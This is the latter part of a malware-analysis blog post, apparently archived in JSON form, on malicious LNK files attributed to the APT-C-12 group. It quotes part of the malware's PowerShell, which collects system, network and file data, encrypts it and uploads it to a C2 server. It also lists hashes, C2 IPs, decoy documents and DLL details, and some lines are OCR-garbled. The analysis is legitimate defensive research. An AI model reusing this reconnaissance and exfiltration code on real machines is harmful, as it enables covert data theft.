yyyyMMddhhmmss)+\"`r`n\";\n$w+=\"systeminfo:`r`n\"+(systeminfo)+\"`r`n\";\n$w+=\"ipconfig /all:`r`n\"+(ipconfig /all)+\"`r`n\";\n$w+=\"netstat -a:`r`n\"+(netstat -a)+\"`r`n\";\n$w+=\"arp -a:`r`n\"+(arp -a)+\"`r`n\";\n$w+=\"desktop files:`r`n\"+(ls -r $home\\desktop)+\"`r`n\";$w+=\"tmp files:`r`n\"+(ls $env:tmp\\..\\)+\"`r`n\";$w+=\"pw cmd:`r`n\"+(getwmiobject win32_process -f \"name='powershell.exe'\" | % {$_.commandline+\"`r`n\"});\n$w+=\"programfiles:`r`n\"+(ls $env:programfiles)+\"`r`n\";\n$w+=\"programfiles x86:`r`n\"+(ls ${env:programfiles(x86)})+\"`r`n\";\n$w+=(Get Date f yyyyMMddhhmmss)+\"`r`n\";\n\n```\n\n-----\n\n```\n$3=-join([char[]](48..57+65..90+97..122) | get-random -c 16);\n$7=new-object security.cryptography.rsacryptoserviceprovider(2048);\n$7.fromxmlstring(\"4RKDLymbgSDghM7HHxZprfPfWcoBQDCL156NPOAsDRiLZ57zj8kcqjq/zgGFAuyhmfmaFBCRz75NIN33Ze105pNzOZXAO975/IpS4xNimVA7vmeEEA\n$7.encrypt([text.encoding]::utf8.getbytes(\"$3\"),$False) > \"$env:tmp\\id\";\niex (\"& '$env:AppData\\WinRAR\\Rar.exe' a -ep1 -y '$env:tmp\\id.rar' '$env:tmp\\id'\")|out-null;\nwhile(!(ts3 (gi \"$env:tmp\\id.rar\") $s 'id')){sleep -s 180}x56 $3 \"$env:tmp\\start.rar\" \"$env:tmp\\start.log\";\nts3 (gi \"$env:tmp\\start.rar\") $s 'start';\ndel -fo \"$env:tmp\\id\",\"$env:tmp\\id.rar\",\"$env:tmp\\start.rar\",\"$env:tmp\\start.log\";\nsr2 $3 $s\n\n```\nThe PowerShell scripts do vary between the samples, but maintain the same key features. Some have blocks of Base64 to obfuscate the\ncalling of the DLL, while others have this code in the clear. Additionally, the PowerShell script passed as a parameter with the DLL does vary\nslightly.\n\nBut at a very high level, the PowerShell extracts out more data from the LNK file, expands that data into a temporary location, loads a\nmalicious dll (with a further PowerShell script as a parameter), obtain user information and data, and encrypts it before sending it back to a C2\nserver. The 360 TIC report examines this code in depth.\n\nTo me, however, what stood out was a string which I have redacted2 appended to the collected data, which could refer to a username or social\nmedia handle to identify the origin of returned data.\n\nLooking at the other LNK samples more of these handle-type names were identified. Of these I was able to identify a social media account for\nat least two of these type of strings in the samples:\n\nSummary of all the key IOCs from the PowerShell identifies possible handles and C2 infrastructure:\n\n**Identifying**\n**String** **SHA 256 Hash** **IP Addresses** **Storage Server** **User Agent** **Other**\n\n\nString 1 20ad6fa72982a6ba0f9499361b2aa3a3\n\nf5cca73fd397c2969d08a4c5f2866814\n\nString 2 b0d7118d75c0f2a99fa5b319148b8914\n\n8800e5db06ee403d6a31c451a8a54f2b\n\nString 3 70b6961af57bce72b89103197c8897a4\n\nae3ce5fdb835ccd050f24acbac52900d\n\nString 1 ea6e7c9b9110c7c21062908be51dd3f8\n\n81490b40b9b77a534fdc7812ab5cd2af\n\n\n159.65.127.93\n\n139.59.238.1\n\n138.197.142.236\n\n139.59.226.29\n\n188.226.144.42\n\n139.59.230.181\n\n159.65.74.97\n\n159.65.127.93\n\n128.199.73.43\n\n159.65.127.93\n\n139.59.238.1\n\n138.197.142.236\n\n\n0123.nyc3.digitaloceanspaces.com Mozilla/5.0 (Windows\nNT 10.0; Win64; x64)\nAppleWebKit/537.36\n(KHTML, like DA)\nChrome/62.0.3202.94\nSafari/.36\n\n0123.nyc3.digitaloceanspaces.com Mozilla/5.0 (Windows\nNT 10.0; Win64; x64)\nAppleWebKit/537.36\n(KHTML, like DA)\nChrome/62.0.3202.94\nSafari/.36\n\n05012.ams3.digitaloceanspaces.com Mozilla/5.0 (Windows\nNT 10.0; Win64; x64)\nAppleWebKit/537.36\n(KHTML, like DA)\nChrome/62.0.3202.94\nSafari/.36\n\n0123.nyc3.digitaloceanspaces.com Mozilla/5.0 (Windows\nNT 10.0; Win64; x64)\nAppleWebKit/537.36\n(KHTML, like DA)\nChrome/62.0.3202.94\nSafari/.36\n\n\nEmbed\nBase6\nexecut\nDLL\n\nEmbed\nBase6\nexecut\nDLL\n\nEmbed\nBase6\nexecut\nDLL\n\n\n-----\n\nString 4 6ccad83fb9f7a50ac95e3e865a27be0\n\n288279e76fcd3b5af495c6fcf6d58fa36\n\n## Hey Taxi!! Cab!!\n\n\n178.128.110.214\n\n198.211.118.118\n\n138.197.135.170\n\n59.73.16.165\n\n\nN/A Mozilla/5.0 (Windows\nNT 10.0; Win64; x64)\nAppleWebKit/537.36\n(KHTML, like DA)\nChrome/62.0.3202.94\nSafari/.36\n\n\nUsing\nserver\nrather\nDigital\nOcean\n\n\nThe PowerShell further extracted a CAB file that contained further files: PDFs, DOCXs, DOCs, and JPEGs along with a DLL with a nonstandard extension (e.g. `.g ), and a legitimate copy of` `rar.exe . The dropped files (sans the .dll, see below) are:`\n\n\n**String**\n**of**\n**Interest**\n**#**\n\n\n**LNK**\n**File**\n**Name** **Dropped Files**\n\n\n**Translated**\n**Dropped Files** **SHA256 Hashes**\n\n\nString 1 陈婧简\n历+作\n品.lnk\n\nString 2 周文\n重：\n2018博\n鳌亚洲\n论坛感\n谢函.lnk\n\nString 3 【2018\n前海合\n作论\n坛】.lnk\n\n\n《互联网发展：信\n息与动态》7月刊\n原稿.docx\n\n《中国工商报》官\n方微博作品.docx\n\n陈婧\n+13957937111+简\n历.doc\n\n周文重：2018博鳌\n亚洲论坛感谢\n函.doc\n\n附件1-2018前海合\n作论坛方案.pdf\n\n附件2-参会回\n执.docx\n\n附件3-深圳市前海\n香港商会简\n介.pdf2018前海合\n作论坛邀请函.pdf\n\n\nca1aea9710219b68fe30b964a526dc82efa08d9032959efd252f7197af1deb21\n\n1a7c9ac35f4c89fe4906ee1c512c2fc5306d8d97d7ab44cc7726475923a311f1\n\nfac0bfb2aedea0fde6e4f239cbfd4de9d8db55e6041cf3f62956b2dc50620506\n\n32b3c6920eb5fcd8bddf55154e6e17453a4f07919216e7df6d84fb3f57a64966\n\n94aa26bac896f65cfebbb76efa9b7009c658e01e2d52d2da338483c3fb5f3188\n\n52384bf0f4e694eb030a31f82b74e4fdcb261e11ede4fefa3cc5f2782bdd370b\n\nf600c66bc52c84698fb52a1f12d2f50fbe3b64754b226e8adb65f0b44a831dc8\n\n091880728698db599e2b577d629d3bc6c9a9b40370f3ce0b9943cee8cbf20302\n\n\n\"Internet\nDevelopment:\nInformation and\nDevelopment\"\nJuly Issue.docx\n\n\"China Business\nNews\" official\nWeibo\nworks.docx\n\nChen Jing +\n13957937111 +\nresume.doc\n\nZhou\nWenzhong:\nThank you letter\nfor Boao Forum\nfor Asia\n2018.doc\n\nAnnex 1-2018\nQianhai\nCooperation\nForum\nProgram.pdf\n\nAnnex 2Participation\nReceipt.docx\n\nAttachment-3Brief\nintroduction of\nShenzhen\nQianhai Hong\nKong Chamber\nof\nCommerce.pdf\n\n2018 Qianhai\nCooperation\nForum Invitation\nLetter.pdf\n\n\n-----\n\nString 1 《政法\n网络舆\n情》会\n员申\n请.lnk\n\nString 4 《观察\n者网》\n采访提\n纲暨相\n关新闻\n附件.lnk\n\n\n《政法网络舆情》\n会员征集函.doc\n\n婺城分局祝您鸡年\n行大运-1.jpg\n\n婺城分局祝您鸡年\n行大运-2.jpg\n\n婺城分局祝您鸡年\n行大运-3.jpg\n\n婺城分局祝您鸡年\n行大运-4.jpg\n\n婺城分局祝您鸡年\n行大运-5.jpg\n\n婺城分局祝您鸡年\n行大运-6.jpg\n\n《观察者网》采访\n提纲.docx\n\n蔡英文接受法新社\n专访问答全\n文.docx\n\n美“友台派”议员又\n作妖，提“2018年\n台湾国际参与法\n案”.docx\n\n美参议员望通过新\n法案 倡议加强美\n与亚洲多方面长期\n合作.docx\n\n美议员鼓动特朗普\n抛弃“一中”政策与\n台湾“复交”,专家可\n能性微乎其\n微.docx\n\n\nab0b6e3a24a4b9f102a58b8536f68ddd560e8b42c16652b9db388ef981bbf165\n\nf6ca0e0bb33163143867bb496f53a6f329a927c06af0c0ddc9506d3c3fd3d335\n\n6fb39753349dd8811270be863b61d0d42120c3452b8b09964e3e6c1d3ab21b7b\n\n7dc76e3c60fac07d61d6dd183624458cf982b25121bcd6a26090365b0bb089d5\n\n8297b9d4f7f0ffb7a8fa99d5cfe93818cb23ddbd99722dbba59e58fab27a86b9\n\n687535ba02c808d795f4893962f0d9b650cea8df40d1de80ea095befe0064b91\n\nb787ff47b1db14409c5524e4bc5f763e3eb5cec3cf34aa553f2b41501e955737\n\n0ad09b21b36ddbaa24653953181cc092400eb992aac329bde58952b96dc0aa9d\n\n140e069093b42d9044c8ccc53cef1b3b0226248b9d7302eb64dcdf92256fa204\n\ne53bfb8826d20be3fc043a08c733221bddc2e1ba394bef9d40144c862ccf377f\n\n283f88c50234a4b3961384c85124c52878ab6af4801cbc0c86a3e1d779c1c48f\n\nafe2f381bf7bcb9309db216a3f956dbf05c70da9bce9dcdcabde7ef0c46c01c9\n\n\n\"Politics and\nLaw Network\nPublic Opinion\"\nMembership\nLetter.doc\n\nTancheng\nBranch wishes\nyou a good luck\nin the Year of\nthe Rooster1.jpg\n\nTancheng\nBranch wishes\nyou a good luck\nin the Year of\nthe Rooster2.jpg\n\nTancheng\nBranch wishes\nyou a good luck\nin the Year of\nthe Rooster3.jpg\n\nTancheng\nBranch wishes\nyou a good luck\nin the Year of\nthe Rooster4.jpg\n\nTancheng\nBranch wishes\nyou a good luck\nin the Year of\nthe Rooster5.jpg\n\nTancheng\nBranch wishes\nyou a good luck\nin the Year of\nthe Rooster6.jpg\n\n\"Observer.com\"\nInterview\nOutline.docx\n\nTsai Ing-wen\naccepted the full\ntext of the AFP\ninterview.docx\n\nUS \"Taiwanese\"\nMPs have made\na demon again,\nmentioning\n\"Taiwan\nInternational\nParticipation Act\nof 2018\" .docx\n\nU.S. Senators\nhope to pass\nnew bill initiative\nto strengthen\nlong-term\ncooperation\nbetween the\nUnited States\nand Asia.docx\n\nU.S. lawmakers\nurge Trump to\nabandon \"one\nChina\" policy\nand \"return\ndiplomatic\nrelations\" with\nTaiwan, experts\nare extremely\nunlikely.docx\n\n\n-----\n\nt t s stage, a e t do e a y a a ys s o t ese 0 es, e cept bas c etadata c ec s O poss b e te est s t e e 陈婧\n```\n+13957937111+简历.doc has the email address [email protected] embedded as a hyperlink.\n\n```\n**DLLs**\n\nThe five DLLs have similar characteristics. All are masquerading as a NVIDIA dll file with similar matadata as below:\n\nA check of relevant hashes indicates three samples are the same, and the other two are different; however, have a recorded compilation time\nwithin 12 seconds of each other.\n\n\n**Identifying**\n**String**\n\n\n**DLL**\n**filename** **SHA 256 Hash** **ImpHash** **Compilation Time**\n\n\nString 4 SwYLR.T a76cb406145b1e094a8ec46ae0cf9594\n\n95bfa4aa19ccf6b48353cc459c00005b\n\nString 1 lyNMk.v f9ee8f1ca51475397e2c190290c0aeb7\n\n4a9f8a36bc0b6dfb500af7ca47d45daa\n\nString 3 FLrzH.w 92ad7532f7b6cb5b6812da586ae9c2c6\n\nddf65de38aebf4067853968be20e72a2\n\nString 2 hxCEm.G f9ee8f1ca51475397e2c190290c0aeb7\n\n4a9f8a36bc0b6dfb500af7ca47d45daa\n\nString 1 beoql.g f9ee8f1ca51475397e2c190290c0aeb7\n\n4a9f8a36bc0b6dfb500af7ca47d45daa\n\n\n9442FCDB7DAAB60B53A67D5A419F71F3 compiler-stamp: Thu\nMay 31 23:06:58\n2018\n\ndebugger-stamp: Thu\nMay 31 23:06:58\n2018\n\n6F5C40C66163B6F9E9E406E6AB83E3CC compiler-stamp: Wed\nFeb 07 22:04:01\n2018\n\ndebugger-stamp:\nWed Feb 07 22:04:01\n2018\n\n8E02074B51513C018F9B73FEB0BEC905 compiler-stamp: Thu\nMay 31 23:07:10\n2018\n\ndebugger-stamp: Thu\nMay 31 23:07:10\n2018\n\n6F5C40C66163B6F9E9E406E6AB83E3CC compiler-stamp: Wed\nFeb 07 22:04:01\n2018\n\ndebugger-stamp:\nWed Feb 07 22:04:01\n2018\n\n6F5C40C66163B6F9E9E406E6AB83E3CC compiler-stamp: Wed\nFeb 07 22:04:01\n2018\n\ndebugger-stamp:\nWed Feb 07 22:04:01\n2018\n\n\n-----\n\ne es `y`, `C` `G a d beoq` `g` t S 56 9ee8 ca5 539 e c 90 90c0aeb a9 8a36bc0b6d b500a ca d 5daa\nwere recorded on Virus Total (35/67) with a first submission date of 2018-04-26 10:14:33 and had the recorded alternative names as\n```\nnvapisetlib, 96d9fd90e180aaf435c21334858654f6.vir (Norton AV) and beoql.g . The other two files were not recorded by that hash\n\n```\non Virus Total.\n\nA rough timeline (if all the dates and times are believed):\n\n2018-02-07: Compilation Date of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa\n2018-04-26: First Submission to VT of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa\n2018-05-31: Compilation Date of DLL samples 92ad7532f7b6cb5b6812da586ae9c2c6ddf65de38aebf4067853968be20e72a2 and\na76cb406145b1e094a8ec46ae0cf959495bfa4aa19ccf6b48353cc459c00005b\n2018-07-12: 360 TIC report\n2018-10-28: Last Submission of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa to VT\n2019-10-29: Submission to Hybrid-Analysis of five LNK samples\n2019-10-29: Submission to Virus Total of only one LNK sample:\n70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d\n\n## The APT Link to the LNKs\n\n[Googling key elements of the above malware samples, led me to the abovementioned report by 360 TIC who detailed the exact campaign for](https://mp.weixin.qq.com/s/S-hiGFNC6WXGrkjytAVbpA)\nonly one of the files (ostensibly sample SHA256 ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af). Their report is\nextensive, and looks at the DLL dropped and its later actions and persistence.\n\nHowever, it is clear the samples were part of a campaign, and two of the files I can very tentatively associate to an online account. One\nidentified social media account has limited use, and is linked to other accounts associated with the Hong Kong democracy movement. The\nsecond account has not been active since 2012 but posted information relating to Chinese corruption and apparent unauthorised detentions by\nthe Chinese state.\n\nHowever, there needs to be further information before any conclusion can be made as to the purpose of these strings.\n\nIf my hypothesis is correct then each malware sample was customised to include the suffix of a known identifier for the target. This likely\nmeans that the attacker did not know much about the target (i.e. end infrastructure they would potentially compromise).\n\n## Intelligence Gaps\n\nThere are significant intelligence gaps that require either deeper analysis on the samples or further external information:\n\nWhy were the samples uploaded now, and en-mass?\nAre the suspicious string suffixes related to targets? Or are they used as reference to accounts controlled by the attacker? Or unrelated\nat all.\nAt least one sample is likely dated from the original 360 TIC report meaning that it was around mid-2018. What is the relationship of this\nsample to the others?\n\n## Conclusion\n\nThere is a bunch of further analysis to be done: including on the DLLs and the other extracted files from the malicious CAB files. This post is\ninitially seeking to put the files out there, and share the comparisons between them.\n\nI’ll reiterate at this time that the ‘attribution’ to the Sapphire Mushroom group is not mine, and solely based on previous reporting and the high\nlikelihood these samples are from the same campaign.\n\n[If you have more information, questions, or analysis feel free to hit me up on Twitter or via email at [email protected]. Thanks for reading!](https://bitofhex.com/cdn-cgi/l/email-protection#2f424e5b5b6f4d465b4049474a57014c4042)\n\n1. All Chinese-language text has been lovingly translated by Google Translate. I apologise for any errors. ↩\n\n2. I have chosen to redact the strings themselves and instead refer to them as STRING 1 - 4. ↩\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-10 - Suspected Sapphire Mushroom (APT-C-12) malicious LNK files.pdf"
    ],
    "report_names": [
        "2020-02-10 - Suspected Sapphire Mushroom (APT-C-12) malicious LNK files.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1876bdf9-2d7c-482c-85d4-df77aef4a8a9",
            "created_at": "2023-01-06T13:46:39.092404Z",
            "updated_at": "2025-03-27T02:00:02.994689Z",
            "deleted_at": null,
            "main_name": "APT-C-12",
            "aliases": [
                "Sapphire Mushroom",
                "Blue Mushroom",
                "NuclearCrisis"
            ],
            "source_name": "MISPGALAXY:APT-C-12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535679,
    "ts_updated_at": 1743041629,
    "ts_creation_date": 1653752756,
    "ts_modification_date": 1653752756,
    "files": {
        "pdf": "https://archive.orkl.eu/42b79dbfecaafeb5d7d25a62c786f465decffd5d.pdf",
        "text": "https://archive.orkl.eu/42b79dbfecaafeb5d7d25a62c786f465decffd5d.txt",
        "img": "https://archive.orkl.eu/42b79dbfecaafeb5d7d25a62c786f465decffd5d.jpg"
    }
}